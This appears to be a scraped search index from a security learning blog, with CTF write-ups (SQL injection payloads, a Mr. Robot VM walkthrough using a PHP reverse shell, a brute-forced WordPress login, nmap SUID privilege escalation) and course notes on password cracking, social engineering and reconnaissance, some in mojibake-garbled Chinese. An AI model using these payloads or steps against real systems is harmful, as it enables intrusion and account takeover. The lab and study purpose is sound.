å³å¯ç»•è¿‡å¾—åˆ°flag\nTwice SQL Injection æ ¹æ®æç¤ºæ˜¯äºŒæ¬¡æ³¨å…¥ï¼ˆä¹Ÿå¯ä»¥å« Second-order injection ï¼‰ ä¸€èˆ¬æ¥è¯´ï¼ˆå°±æˆ‘æ‰€è§è¿‡çš„ï¼‰ï¼Œåç«¯çš„è„šæœ¬åªä¼šå¯¹æ³¨å†Œæ‰€ä¼ è¾“çš„å˜é‡è¿›è¡Œä¸¥æ ¼çš„è¿‡æ»¤ï¼Œè€Œåœ¨ç™»é™†çš„æ—¶å€™ï¼Œå´æ²¡æœ‰è¿›è¡ŒäºŒæ¬¡ç¡®è®¤\nå› æ­¤æˆ‘ä»¬æµ‹è¯•æ³¨å†Œå‡ ä¸ªç”¨æˆ·å\n# æµ‹è¯•æ˜¯å¦å¯ä»¥ç™»é™†adminè´¦å· admin-- - admin\u0026#39; -- - admin\u0026#34; -- - # æµ‹è¯•ç›´æ¥è·å–ä¿¡æ¯ -1 union select database()-- - -1\u0026#39; union select database()-- - #æˆåŠŸ -1\u0026#34; union select database()-- - -1\u0026#39;) union select database()-- - -1\u0026#34;) union select database()-- - å‘ç° -1' union select database()-- - è¿”å›äº†databaseä¿¡æ¯\n é‚£ä¹ˆæ¥ä¸‹æ¥å°±æ˜¯æ­£å¸¸æµç¨‹\n-1\u0026#39; union select group_concat(table_name) from information_schema.tables where table_schema=\u0026#34;ctftraining\u0026#34;-- - -1\u0026#39;unionselectgroup_concat(column_name)frominformation_schema.columnswheretable_name=\u0026#34;flag\u0026#34;-- - -1\u0026#39; union select group_concat(flag, \u0026#39;,\u0026#39;) from flag-- - å³å¯è·å¾—flag\n","date":"2022-03-18T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/pwnthebox_web_easy/","title":"Pwn The Box WEB-Easy"},{"content":"SCT Topic 8: Password Cracking Case Study: Adobe Password Leak If you are familiar with how online service store users\u0026rsquo;s password, let me ask you:\nHow Should You Do?\n Yes, we will use hash algorithm, salt and store the hashed password and salt, which actively avoid the exposion of plaintext password and brute force.\nBut how Adobe Did It?\n What were the consequences?\n If you get the master key, literally you own all \u0026ldquo;encrypted passwords\u0026rdquo; If two users choose same password, their encrypted ciphertext are same, consequently, frequently analysis would help hacker to find out the details of encryption process.  For more details, please refer to this article: Anatomy of a password disaster â€“ Adobeâ€™s giant-sized cryptographic blunder\nCryptanalysis basics  Cryptanalysis The study of techniques to reveal what cryptography is attempting to hide or protect.  In other words, break the cryptographyic algorithms without knowing the key.\nCryptanalysis are based on:\n The nature of the cryptographic algorithm the key some knowledge on the text, such as language(common words), format or encoding (script, image alway begin with some same pattern), a section with both plaintext and encrypted text  Brute-force attacks  Brute-force attack Aim to decrypt an encrypted text by exhaustively trying all possible secret keys until you obtain a meaningful plaintext  On average, you need to try at least half of all the possible keys to be successful\nFor example, to brute force a 4-digit password, the number of possibilities is 10^4 = 10000, therefore, on average, a brute-force attack in this scenario will succeed after 5000 attempts. If 1 attempt cost 1s, it needs at least 1h24min to finish this work.\nDictionary attacks 4-digit password needs one hour and half? Forget about it, let\u0026rsquo;s to try something not so naive.\nLet\u0026rsquo;s first define the term \u0026ldquo;password\u0026rdquo; as a user-defined encrypted secret key.\n Passowrd dictionary attacks Use a \u0026ldquo;dictionary\u0026rdquo; of possbile words (based on an attacker-defined alphabet) to make exploitation attempts, including English words, user\u0026rsquo;s private information and common passwords.  Common dictionaries for attacks include:\n Words and meaningful fragments of words combination for a certain language Personal information (e.g., obtained from OSINT or social engineering) Lists of names, locations, dates, companies, etc.  Therefore, if the attackers use dictionary attack, the password length does not provide too much help on password robustness.\nPassword robustness There are four main elements to determine the security of a password\n Number of symbols in the password As we mentioned before, 4-digit locker would require on average 10^4/2 seconds, or almost 1.5 hours to brute force, the longer password, the longer time to brute force. Number of possibilities for each position We continue use previous example, if we expand the types of symbols to alphabet and number, the possibilities expand to 36*36*36 for brute force, which requires much more time than 1.5 hours. Time required for each attempt Based on my experience, some online service will delay the login attempt to expand the time of brute force, which may also help to defend the attack like DDoS. Are there easier alternatives Remember we metioned in Social Engineering: \u0026ldquo;The easiest way to get the information you want is always by asking the victims themselves\u0026rdquo;? There are always more than one way to get the answer of a question, so does cryptanalysis, you can even physically break the lock :)\nSome common alternatives:\n finding write-down notes in officers shoulder-surfing, i.e., looking over someone\u0026rsquo;s shoulder when they\u0026rsquo;re typing their passwords physical break-in physically stealing passwords lists or logbooks    Cryptographic hash functions  Hash function A function that maps input data of arbitrary size to fixed-size output values called hashes. Crytographic hash functions (CHF) are hash functions more suitable for information security applications which contains ideal following properties:  deterministic: given message M, its hash H(M) is alwaysthe same quick to compute unfeasible to generate message M that has a specific hash value H (hard to find alternative message M') unfeasible to find messages M1 and M2 such that H(M1) = H(M2) (hard to find a collision) avalanche effect: a small change in message M leads to siginificant change to the hash value.    Usage of CHF includes MACs (Message Authentication Codes), digital signatures and authentications.\nLet\u0026rsquo;s use an example for better understanding of CHF\nLeft hand column is the input, after cryptographic hash function, we get the output, we called Digest here.\nWe can observe that, a single character change of input text, the digest would be very different from previous one.\n As you can easily guess, there are many problems and attacks which threat the CHF:\nThe birthday problem (or the birthday paradox) Let me ask you a classic question, how many people you need in a single room, which makes the probability that at least two person share a birthday to be 50%?\nYou only need 23 people to raise probability to 50 per cent.\nProve: The goal is to compute P(A), the probability that at least two people in the room have same birthday.\nHowever, it is simpler to calculate the reverse one, P(A\u0026rsquo;), the probability that NO two people in the room have the same birthday.\nTo calculate P(A\u0026rsquo;), the event is that person 2 does not have the same birthday as person 1, and that persona 3 does not have the same birthday as either person 1 or person 2, and so on, and finally that person 23 does not have the same birthday as any of persons 1 through 22.\nLet\u0026rsquo;s number this event as Event 1 to Event 23\nLet\u0026rsquo;s calculate the product of the probability of these events:\n Evaluating equation with (23) gives P(A\u0026rsquo;) â‰ˆ 0.492703\nTherefore, P(A) â‰ˆ 1 âˆ’ 0.492703 = 0.507297 (50.7297%).\nAlso, according to the pigenhole principle, the probability reaches 100 per cent when at least 367 people are present since there are only 366 possible birthdays.\nBased on above knowledge, we can understand that birthday attack is based on higher likelihood of collisions found between random attack and fixed degree of permutations.\nCollision attack The collision attack aims to identify two inputs that generate the same hash.\nMore formally, we assume user has password P with hash H(P), an attacker may find another string Q, such that H(P) = H(Q)\nThis is why we need CHF to have the property to make it feasible to find the collision.\nPreimage attack The preimage attack aims to find a message that has a specific hash value\nMore formally, an adversary \u0026ldquo;tweaks\u0026rdquo; an input message M\u0026rsquo; until H(M\u0026rsquo;)=H(M)\nThis attack will put huge harm to the security property: Integrity, because if this kind of tweak success, we can not trust anything, even if it has been hashed.\nLet\u0026rsquo;s see an example:\n Message M: Give Mr John Smith a salary increase of Â£1,000.  This message will be digitally signed as a contract by CHF H.\nBut the attacker finds some alternatives of messages which change their meaning of the input message, but get the same output digest as H(M)\n Message Mâ€™: Award Mr Smith a raise of Â£2,000 Message M\u0026rsquo;\u0026rsquo;: Present John Smith a bonus of Â£3,000  Same signed hash value, different meaning, how powerful it is\u0026hellip;\nMD5 collision exercise When we download some files/software, many of them will provide md5 authentication, to authenticate that the integrity of the software, however, here is a exercise that shows MD5 can not be trusted anymore.\nPlease review the details, I will just post something interesting here:\nLet\u0026rsquo;s see two programs like this:\nProgram 1: if (data1 == data1) then { good_program } else { evil_program } Program 2: if (data2 == data1) then { good_program } else { evil_program } The only difference between these two statements is the variable to compare, however, it has been proved by Chinese researchers that we can only change some data in the input source files, but get the same MD5 hash value, which announce the death of MD5.\nRainbow table attacks In this section, we will see a smarter variant of dictionary attack to do the brute force, it called pre-computed dictionary attack.\nIn this attack, we will pre-compute a list of hashes of dictionary words, and store in a table, which you can always easily to map the hashed text and plaintext password. If \u0026ldquo;hash-chain\u0026rdquo; functions are used to store the pre-computed hashes(to reduce the storage space), then the table is called a rainbow table.\nLet\u0026rsquo;s use an example to introduce the terms and processes in a Rainbow Table usage.\n  The letter H denotes a hash function.\n  The letters R_i denote different reduction functions, which aim to store more plaintext-hashed-text chains in the table (The number and sequences of reduction functions are same in each row).\n  We only store two columns of data in a system: 1. The first column (in green) and the last (in yellow).\n How we utilise the rainbow table the plaintext of a given hashed text?  Step 0 We find the hashed text \u0026quot;re3xes\u0026quot; in /etc/shadow directory of the victim, we want the plaintext of this password, and have a rainbow table which contains two columns (green and yellow).     Step 1 We use the reduction function R3 on \u0026quot;re3xes\u0026quot; (start from last reduction function) and see if the result \u0026ldquo;rambo\u0026rdquo; is in the last column of the rainbow table. In this example it is not.\n   Step 2 Next, try two rounds of reduction function, use reductions R2 and R3 and obtain \u0026ldquo;linux23\u0026rdquo; as the result.\n   Step 3 Find the match\n   Step 4 Start with matched plaintext column \u0026ldquo;passwd\u0026rdquo; and do the reductions to reach plaintext which will hashed to given hashed text \u0026ldquo;re3xes\u0026rdquo;.\n    Summary We assume that the given hashed text are contained in the chains of a row in the rainbow table, and use a sequence of reduction functions and hash function to see if it could reach the last column. If there is match, then we could locate the row of first (green) column and begin to reproduce the chains and get the plaintext.\n   Salt Remember that I mentioned a term in first section: Salt?\nRainbow table attacks and pre-computed dictionary attacks can be thwarted via the use of salt.\nThe reason is very simple, even if you can use pre-computed table based on some common use dictionaries, but you can predict what\u0026rsquo;s the salt are used in hashing.\nHere are the most common mistakes in applying salt:\n  Using short salts: if the salt is too short, the attacker may predict or brute-force pre-computed dictionaries with known salts.\n  Reusing salts: if you reuse the salt for multiple accounts, the attacker can easily find out that the plaintext passwords were the same, and use side-channel information (e.g., password hints) to corrupt multiple accounts at once.\nMoreover, if the attacker randomly predicted the correct salt while computing a precomputed dicionary, then all the passwords would be compromised at once.\n  Finally it is important to note that using a â€˜saltâ€™ is not robust enough to thwart dictionary attacks, but only the pre-computation.\nCountermeasures and best practices Weak passwords  Default passwords Default provided by system vendor which should be changed at installation time  password default admin guest   Dictionary words Including non-English dictionaries:  chameleon RedSox sandbags bunnyhop IntenseCrabtree   Words with numbers appended These can be easily tested automatically by attackers with little time cost.  password1 deer2000 john1234   Words with simple obfuscations Still, it can be tested automatically with little additional effort  p@ssw0rd l33th4x0r g0ldf1sh   Doubled words  crabcrab stopstop treetree passpass.   Common sequences from a keyboard row  qwerty (keyboard) 123456 asdfgh (keyboard) fred.   Numeric sequences based on well known numbers such as  911 (9-1-1, 9/11) 314159\u0026hellip; (pi) 27182\u0026hellip; (e) 112 (1-1-2).   Identifiers  jsmith123 1/1/1970 555â€“1234 one\u0026rsquo;s username.   Weak passwords in non-English languages  contraseÃ±a (Spanish) ji32k7au4a83 (encoding from Chinese).   Anything personally related to an individual All these can be easily tested automatically after a simple investigation of a person\u0026rsquo;s details, eg through social engineering.  license plate number social security number current or past telephone numbers student ID number current address previous addresses birthday sports team relative\u0026rsquo;s or pet\u0026rsquo;s names, nicknames, birthdays, initials, etc.   Dates Dates follow a pattern and make passwords weak. Common passwords from previous leaks For example, the top 10 most common passwords in a CNN article:  123456 123456789 qwerty password 111111 12345678 abc123 1234567 password1        Side-channel attacks As its name suggest, rather than exploiting the weakness of the algorithm itself (eg. cryptanalysis and software bugs), a side-channel attack relies on information gained from the implementation of a computer system.\nFor example:\n timing information (eg, implement the encryption, hashing) power consumption electromagnetic leaks sound  If you are familar with SQL injection, the time-based blind injection is also a side-channel attacks.\nLet\u0026rsquo;s look at the details of a timeing attack: By analyse time taken by the cryptographic algorithm implementation operation, the attacker is able to reverse engineer the input.\nIn 2003, Boneh and Brumley published a practical network-based timing attack on SSL-enabled web server, the server key was recovered in a matter of hours using this method.\nGood practice around passwords  Do not reuse passwords  Browser KeePassX Local   Use password managers Use Two-Factor Authentication (2FA)  ","date":"2022-03-18T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/password_cracking/","title":"SCT Topic 8: Password Cracking"},{"content":"Writeup æˆ‘çš„å°è¯• æ‹¿åˆ°é¢˜ç›®ï¼Œçœ‹åˆ°OVAæ ¼å¼ï¼Œç›´æ¥åœ¨virtualboxä¸­æ‰“å¼€\nçœ‹åˆ°å…³é”®è¯wordpressï¼Œè²Œä¼¼æ˜¯ä¸€ä¸ªå†™blogçš„å·¥å…·ï¼Ÿ\nå¯åŠ¨åå‘ç°éœ€è¦ç™»é™†ï¼Œæ ¹æ®å¸ˆå‚…çš„æç¤ºæ²¡æœ‰è¿‡å¤šçº ç¼ ï¼Œåº”è¯¥æ˜¯è¦é€šè¿‡ä¸€ä¸ªç½‘é¡µæ¥å…¥æ‰‹\nè¿™æ—¶å€™æƒ³åˆ°ä»¥å‰ç”¨sshè¿æ¥è™šæ‹Ÿæœºçš„æ—¶å€™ï¼Œå¾€å¾€ç”¨vmwareå¯åŠ¨è™šæ‹Ÿæœºåä¸ç”¨ç®¡ç™»é™†ï¼Œç›´æ¥ç”¨sshå°±å¯ä»¥ï¼Œè¯´æ˜åå°æœåŠ¡å…¶å®å·²ç»å¯åŠ¨ï¼ŒåŠ ä¸Šéœ€è¦ç½‘é¡µçš„çº¿ç´¢ï¼Œæƒ³åˆ°é€šè¿‡åˆ†é…åˆ°çš„å±€åŸŸç½‘IPåœ°å€æ‰¾åˆ°ç½‘é¡µ\nifconfig | grep \u0026#34;inet\u0026#34;  å†æ¬¡å¯åŠ¨åï¼ŒæŸ¥çœ‹ç½‘ç»œé…ç½®ï¼Œè§‚å¯Ÿåˆ°å‡ºç°äº†ä¸€ä¸ªæ–°çš„å±€åŸŸç½‘\n ç„¶åé€šè¿‡nmapè¿›è¡Œæ‰«æï¼Œç¡®è®¤ç›®æ ‡ç½‘ç»œåœ°å€\n å°è¯•ä¸¤ä¸ªipåœ°å€ï¼Œç¡®è®¤ç™»é™†åˆ°ç›®æ ‡ç½‘ç«™ä¸º192.168.56.118ã€‚ åœ¨å¼€åœºåŠ¨ç”»ä¸­è§‚å¯Ÿåˆ°ä¸€ç»„ç”¨æˆ·å:å¯†ç ,root:Ã¢â‚¬Â¢Ã¢â‚¬Â¢Ã¢â‚¬Â¢Ã¢â‚¬Â¢Ã¢â‚¬Â¢Ã¢â‚¬Â¢Ã¢â‚¬Â¢Ã¢â‚¬Â¢Ã¢â‚¬Â¢Ã¢â‚¬Â¢Ã¢â‚¬Â¢ ä½†æ˜¯ä¼¼ä¹æ²¡æœ‰åŠæ³•ç›´æ¥è¾“å…¥ç‰¹æ®Šå­—ç¬¦ï¼Œåº”è¯¥ä¹Ÿä¸é‡è¦ï¼Œæš‚æ—¶æ”¾å¼ƒ\nåœ¨ç»ˆç«¯ç•Œé¢å°è¯•linuxå‘½ä»¤ï¼Œå‡æ˜¯åŒæ ·çš„æŠ¥é”™ï¼šError: Command not recognized. Type help for a list of commands.\næ­¤æ—¶æˆ‘æ‰“å¼€Burp Suiteå¼€å§‹æ‹¦æˆªhttpè¯·æ±‚ï¼Œ æ¥ä¸‹æ¥å°è¯•æä¾›çš„å‡ ä¸ªå‘½ä»¤ï¼Œå‘ç°éƒ½æ˜¯æœªä¿®æ”¹è¿‡çš„å½±ç‰‡ä»¥åŠå›¾ç‰‡å†…å®¹ï¼Œæ„Ÿè§‰æ˜¯æ¥è‡ªæŸéƒ¨ç”µå½±æˆ–è€…ç”µè§†å‰§ï¼ŒåŒæ—¶éƒ½æ²¡æœ‰æ‹¦æˆªåˆ°ä¸åå°çš„äº¤äº’ï¼Œæš‚æ—¶æ„Ÿè§‰æ²¡æœ‰æœ‰ä»·å€¼çš„å†…å®¹\nä½†joinå‘½ä»¤å´è¦æ±‚è¾“å…¥é‚®ç®±ï¼Œæœ‰ç”¨æˆ·è¾“å…¥æ„Ÿè§‰å°±å¯ä»¥æ“ä½œï¼ŒBurpsuiteç”¨intruderè¿›è¡Œæ‰«æï¼Œå…¨éƒ½è¿”å›äº†ç»Ÿä¸€çš„404ï¼Œ\n ä½†åŒæ—¶è¿”å›äº†ä¸€ä¸ªé”™è¯¯é¡µé¢\n è‡³æ­¤æˆ‘å·²ç»æ²¡æœ‰ä»€ä¹ˆå…¶ä»–æƒ³æ³•äº†ï¼Œå…¶ä»–çš„ä¸€äº›å°è¯•åŒ…æ‹¬è®¿é—®https://www.whoismrrobot.com/ ï¼Œå°è¯•é˜…è¯»htmlæºç ä»¥åŠç›®å½•ä¸‹çš„ä¸€äº›jsä»£ç ï¼Œä¹Ÿæ²¡æœ‰æ”¶è· æ‹¿åˆ°äº†é‡Œé¢çš„ä¸€äº›user:pwdï¼Œä½†ä¹Ÿæ²¡æ²¡æœ‰ä»€ä¹ˆä½œç”¨ï¼Œç„¶åå°±æœåˆ°äº†åŒæ ·é¢˜ç›®çš„write-upï¼Œä¸€å¼€å§‹æ‰“ç®—çœ‹ç‚¹æç¤ºï¼Œä½†æµè§ˆä¸€ä¸‹å‘ç°å·²ç»è¶…å‡ºèƒ½åŠ›èŒƒå›´ï¼Œåªèƒ½æ‹¿æ¥å­¦ä¹ ä¸€ä¸‹äº†\næ ¹æ®write-upçš„å¤ç° ä»¥ä¸‹å†…å®¹æ˜¯æ ¹æ®æ‰¾åˆ°çš„write-upçš„å¤ç°ï¼ŒåŒæ—¶å¸¦æœ‰ä¸€äº›æ€è€ƒ ç¬¬ä¸€ä¸ªkey é¦–å…ˆä½¿ç”¨ç›®å½•æ‰«æå·¥å…·æ¥å¯¹ipåœ°å€è¿›è¡Œæ‰«æï¼Œç”¨åˆ°äº†diremapå·¥å…·\npython3 dirmap.py -i 192.168.56.118 -lcf å‘ç°ä¸€ä¸ªç†Ÿæ‚‰çš„æ–‡ä»¶robots.txtï¼Œä»¥å‰ä¹Ÿé‡åˆ°è¿‡åœ¨è¿™ä¸ªæ–‡ä»¶ä¸­åŒ…å«ä¿¡æ¯çš„æƒ…å†µ\nå¾—åˆ°ä¸¤ä¸ªæ–‡ä»¶ï¼Œåˆ†åˆ«æ‰“å¼€\nUser-agent: * fsocity.dic key-1-of-3.txt å¾—åˆ°ç¬¬ä¸€ä¸ªkeyï¼škey-1-of-3.txt, ä»¥åŠä¸€ä¸ªå­—å…¸æ–‡ä»¶fsocity.dicï¼Œæ­¤æ—¶åˆ¤æ–­å¯èƒ½æ˜¯éœ€è¦é€šè¿‡Burpè¿›è¡Œçˆ†ç ´ä½¿ç”¨\n073403c8a58a1f80d943455fb30724b9 ç¬¬äºŒä¸ªkey åˆ©ç”¨å­—å…¸è¿›è¡Œçˆ†ç ´ç”¨æˆ·åï¼Œå¾—åˆ°ä¸¤ä¸ªæœ‰ç”¨çš„ç”¨æˆ·åElliotå’Œelliotï¼Œä¼¼æ›¾ç›¸è¯†ï¼Œä¹‹å‰åœ¨æœç´¢ https://www.whoismrrobot.com/ ç½‘ç«™ä¿¡æ¯çš„æ—¶å€™æœ‰äººæåˆ°è¿‡è¿™ä¸ªåå­—\n å†æ¬¡çˆ†ç ´å¯†ç ï¼Œå¾—åˆ°å¯†ç ER28-0652\nç™»é™†wordpress\næ¥ä¸‹æ¥éœ€è¦è·å–ä¸€ä¸ªshellï¼Œæµè§ˆwordpressï¼Œæ‰¾åˆ°å¯ä»¥æ”¾å…¥webshellçš„åœ°æ–¹ï¼Œå°†kaliè‡ªå¸¦çš„php-reverse-shell.phpå¯¼å…¥ï¼Œç„¶åç”¨ncåå¼¹shellï¼Œ\næˆ‘è¿™è¾¹å°†php-reverse-shell.phpå¯¼å…¥404.phpä¸­ï¼Œupdate fileä¹‹åè®¿é—®ï¼Œä½†æ˜¯æˆ‘é¦–å…ˆå¾—åˆ°çš„æ˜¯network unreachable(101)çš„ç»“æœï¼Œkaliä¹Ÿæ²¡æœ‰ç›‘å¬åˆ°æ¥è‡ª8888ç«¯å£çš„ä»»ä½•ä¿¡æ¯ï¼ŒåŒæ ·æµ‹è¯•ä¸»æœºçš„ncï¼Œä¹Ÿæ— æ•ˆã€‚è¿™æ—¶å€™æˆ‘æ‰æ„è¯†åˆ°é¶æœºå¯èƒ½ä¸å…è®¸å‘ä¸åŒç½‘æ®µçš„åœ°å€å‘é€æˆ‘ä»¬æƒ³è¦çš„ä¿¡æ¯ã€‚\nå› æ­¤æ¥ä¸‹æ¥éœ€è¦å°†é¶æœºå’Œkaliè®¾ç½®åˆ°åŒä¸€ç½‘æ®µä¸‹ï¼Œé‡æ–°åœ¨vmware fusionä¸­æ‰“å¼€é¶æœºï¼Œè®¾ç½®ä¸ºæ¡¥æ¥\n æ­¤æ—¶åœ¨kaliä¸Šæœç´¢è‡ªå·±çš„ç½‘æ®µï¼Œå¾—åˆ°äº†æ–°çš„ipåœ°å€ï¼Œ172.16.249.10ï¼Œä¹‹åé‡å¤ä¸Šè¿°æ“ä½œ\n kaliæ‰“å¼€ncè¿›è¡Œç›‘å¬ï¼Œæ‹¿åˆ°shell\n è¾“å…¥whoamiæŸ¥çœ‹ç”¨æˆ·ï¼Œå‘ç°æ˜¯daemonä¸æ˜¯rootï¼Œæ¥ç€æŸ¥çœ‹é¶æœºçš„å¯†ç  cat /etc/passwd\n å°è¯•ç”¨å¯†ç ç™»é™†robotç”¨æˆ·ï¼šsu robot\n æç¤ºéœ€è¦ç»ˆç«¯æ‰èƒ½æ‰§è¡Œï¼Œåˆ©ç”¨pythonç”Ÿæˆä¸€ä¸ªç»ˆç«¯\npython -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; ä½¿ç”¨å¯†ç è¿›è¡Œç™»å½•åï¼ŒæŸ¥çœ‹æ–‡ä»¶ï¼Œå¾—åˆ°ç¬¬äºŒä¸ªkeyçš„å€¼\n ç¬¬ä¸‰ä¸ªkey æ¥ç€è¿›è¡Œææƒ å­¦ä¹ å‚è€ƒæ–‡ç« ï¼šhttps://www.anquanke.com/post/id/86979 åˆ©ç”¨ä¸€ä¸‹å‘½ä»¤ï¼Œå¯ä»¥å°†ä» / ç›®å½•ä¸­æŸ¥æ‰¾å…·æœ‰SUIDæƒé™ä½ä¸”å±ä¸»ä¸ºrootçš„æ–‡ä»¶å¹¶è¾“å‡ºå®ƒä»¬ï¼Œç„¶åå°†æ‰€æœ‰é”™è¯¯é‡å®šå‘åˆ°/dev/nullï¼Œä»è€Œä»…åˆ—å‡ºè¯¥ç”¨æˆ·å…·æœ‰è®¿é—®æƒé™çš„é‚£äº›äºŒè¿›åˆ¶æ–‡ä»¶ã€‚\nfind / -user root -perm -100 -print 2\u0026gt;/dev/null find / -perm -u=s -type f 2\u0026gt;/dev/null find / -user root -perm -100 -exec ls -ldb {} ; æœç´¢å¸¸è§çš„å…·æœ‰ææƒåŠŸèƒ½çš„Linuxå¯æ‰§è¡Œæ–‡ä»¶ï¼š\nNmap Vim find Bash More Less Nano cp æ‰§è¡Œåå‘ç°nmapï¼Œç¡®è®¤æƒé™ä¸­åŒ…å«\u0026rsquo;s\u0026rsquo;ï¼Œä¸ºrootæ‰€æœ‰\n æ¥ä¸‹æ¥åˆ©ç”¨æ—§ç‰ˆæœ¬çš„nmapæä¾›äº¤äº’æ¨¡å¼å¯ä»¥å¾—åˆ°ä¸€ä¸ªå…·æœ‰ç›¸åŒæƒé™ä¹Ÿå°±æ˜¯rootæƒé™çš„shellï¼Œè¿›è¡Œææƒåï¼Œå†/rootç›®å½•ä¸‹é¢å¾—åˆ°ç¬¬ä¸‰ä¸ªkey\n æ€»ç»“ å‘ç°äº†å¾ˆå¤šçš„ä¸è¶³ï¼Œå­¦åˆ°äº†å¾ˆå¤šæ€è·¯å’Œå·¥å…·çš„ä½¿ç”¨ï¼Œæ„Ÿè§‰ä¹‹åè¿˜æ˜¯åº”è¯¥å¤šåšé¢˜ï¼Œå…ˆæŠŠé‡ç‚¹æ”¾åœ¨äº†è§£å‰äººçš„æ€è·¯ä»¥åŠå„ç§å·¥å…·çš„ä½¿ç”¨ä¸Šï¼Œè€Œä¸æ˜¯è¿‡åº¦çº ç»“ä¸€äº›é¢˜ç›®ï¼š æ–‡ä»¶ç›®å½•æ‰«æï¼Œdirbusterï¼Œdirmap,gobuster æœ‰ç”¨çš„ç”¨æˆ·åä¼šæœ‰ä¸ä¸€æ ·çš„è¿”å›ï¼Œå¯ä»¥å…ˆæ‰«ç”¨æˆ·åå†æ‰«å¯†ç  webshellä¸åå¼¹shellï¼Œnetcatçš„ä½¿ç”¨ ç”Ÿæˆç»ˆç«¯ linuxç‰¹å®šç”¨æˆ·ç™»å½• md5è§£å¯† æœç´¢å…·æœ‰rootæƒé™çš„å¯æ‰§è¡Œæ–‡ä»¶ åˆ©ç”¨nmapçš„äº¤äº’æ¨¡å¼è¿›è¡Œææƒ ç­‰ç­‰\n","date":"2022-03-13T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/mr_robot/","title":"Mr. Robot writeup"},{"content":"SCT Topic 7: Social Engineering Strategies and Principles \u0026ldquo;The easiest way to get the information you want is always by asking the victims themselves:)\u0026rdquo;\n Definition: Social engineering Social engineering is the practice of manipulating peopleinto revealing confidential or sensitive information about the organisation, or to perform certain actions, such as:  open an infected attachmentvia email click on a URL of a compromised website divulge information over the phone    Instead of utilising the vulnerabilities we have seen previously, social engineering relies on non-technicalstrategies to exploit the weaknesses of human psychology.\nIt is very similar to some \u0026lsquo;marketing\u0026rsquo; purposes, which often involved \u0026lsquo;acting skills\u0026rsquo;, it requires social engineers to be confident with themsevles, and this sense of confidence will then naturally psychologically transfer also to the victim.\n\u0026ldquo;Pretending not be afraid is as good as actually not being afraid. \u0026mdash;-David Letterman\u0026rdquo;\nKey principles There are six key principles of influence that correspond to human behaviours heavily exploited by social engineering, identified by Professor Robert Cialdini, Regents\u0026rsquo; Professor Emeritus of Psychology and Marketing at Arizona State University, which originally from marketing\u0026rsquo;s purposes.\n Principle 1: Reciprocity People tend to return a favour. People usually do not trust free lunch, they would be more delight to take the benefit by doing a favouralso to the attacker.\n Principle 2: Commitment and consistency People are willing to be honour to the ideas and goals they committed which fits their self-image, e.g., particular charity activities,recyling, vegetarianism. This a mental shortut we use to simplify our decision-making: we tend to simplify our decision makingby using a post decision as reference for subsequent related choices. Consequently, we act in ways that are consistent with our intial action our thought, so that when we commit to something or someone, we stick to it.\n Principle 3: Social proof/consensus People are tend to follow the crowd. For example, if attackers can convince the victim that their colleagues, friends or family already done that, the victims will be more willing to click the malicious link.\n Principle 4: Autority/intimidation People tend to obey authority figures, even if they are asked to perform objectionable acts. The attacker can try to impersonate some senior members in their organisation or from government organisation, which the victim may not know personally.\n Principle 5: Liking/familarity People are more easily persuaded by people who seems to be familiar with themselves. The attackers could establish a link between them and victims by calling their first name, nickname, or throw some topics they may interesting (e.g., hobbies, sports).\n Pirnciple 6: Scarcity/urgency Perceived scarcity will generate demand, and it may induce urgency in the victim. In this kind of scenario, victim could more easily to lose their judgement. Like a time-limited demand of work from the boss.\n  Attack Phases Reconnaissance Phase  Aims to Appear credible and lure the victims into revealing sensitive information or perform dangerous actions Goals Learn about roles or key figures in the organisation, and find organisation contact detailsand finally choosing victims.  Passive and Active reconnaissances can explore the tactics to identify hosts, networks, and users of interst, see more details in previoius post about reconnaissance.\nVictim Approach Phase   Goals?\nEstablish a confidential relationship/feeling between attackers and the victim, by\n Exact victim\u0026rsquo;s positions in the company Use of nicknames known only in the company Praising the role of the victim (e.g., knowing what they do) Belonging to some mailing list Personal interests of the victim      Who?\nUsually, Not senior members, but who closely tied to them (e.g., secretaries, collaborators)\n    Where?\nPhone, e-mail, social network (rarely done in person or face to face)\n    How?\nSpear phishing : Spear here is used to differentiating with traditional phishing, which is crafted for a specific victim. Send a targeted email to the vicitm, to lure them into clicking a link, opening an attachment, or revealing some sensitive information.\nVishing : Make a voice phone callto lure the victim into believing there is a demand for revealing sensitive information or performing attacker-desired actions. The attacker could impersonate a manager/senior member of the organisation, or pretending to be a colleague in need, which use the principle of \u0026ldquo;Principle 4: Authority/intimidation\u0026rdquo;.\nSmishing : The attacker choose the most trusted communication method, and sending a text message to victims.\nTailgating : Instead of getting information from the victim in previous stragies, tailgating is aim to enter a restricted areas, it can be realised by following people with access, or pretending to be someone with access, for instance, a courier.\nQuid Pro Quo : The attacker offers something in exchange for following his orders.\n For example, the attacker may call the victims and pretend to be a technician, then convince the vicitm to follow commands to grant him access or which lead to malware installation. Occssionally, the attacker may already have pre-install malware which slows down the PC, then try to contact the victim to provide some help.    Watering hole attacks https://www.ncsc.gov.uk/collection/supply-chain-security/watering-hole-attacks\nWatering hole attack is a social engineering attack, aims to exploit websites which frequently visit by target organisation for distribution of malware.\nPredator animals are used to wait those preys who will come to watering hole for water.\n find a target organisation or group find their frequently visited/viewed websites find the weakness of these websites Inject scripts which could trigger driven-by download attack Victims visit the website and trigger the download attack Malware could be a Remote Access Trojan which can gain remote access to target\u0026rsquo;s system  Countermeasures The core of social engineering is people, companies need to make regular security training for employees in all roles, to make them be aware of the potential strategies of attackers.\nSome strategies to check if you are being a victim of social engineering include:\n asking for the correct spelling of their name asking for a number where you can return the call asking them why they need this information asking them who has authorised the request and let them know that you will verify the authorisation.  In general, if you suspect a social engineering attempt, report incidents immediately to the companyâ€™s security teams. Be skeptical and aware of risks.\nLook for emails with urgent requests of sensitive information or delicate actions, and typosquatting e-mail addresses.\n","date":"2022-03-07T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/social_engineering/","title":"SCT Topic 7: Social Engineering"},{"content":"SCT Topic 6: Network Reconnaissance and OSINT The initial phase of network security assessment is reconnaissance, in my understanding, this phase is used to gather the information of the target, including hosts, networks, users, services, etc.\nIt is an essential preparation mission before you can really do something to the target.\nAnd the reconnaissance could be separated to passive or active.\nPassive reconnaissance In this case, \u0026quot;passive\u0026quot; means you do not directly interact or engage with target system. More specifically, you do not send any type of request to the target, thus the targets have no way of acknowledgement what you are doing.\nYou should use all the tools to gather more information as possible (free, open source, commercial tools)\n Querying Search Engines and Websites There are some typical data you can gather by querying search engines and websites  Physical address of office locations 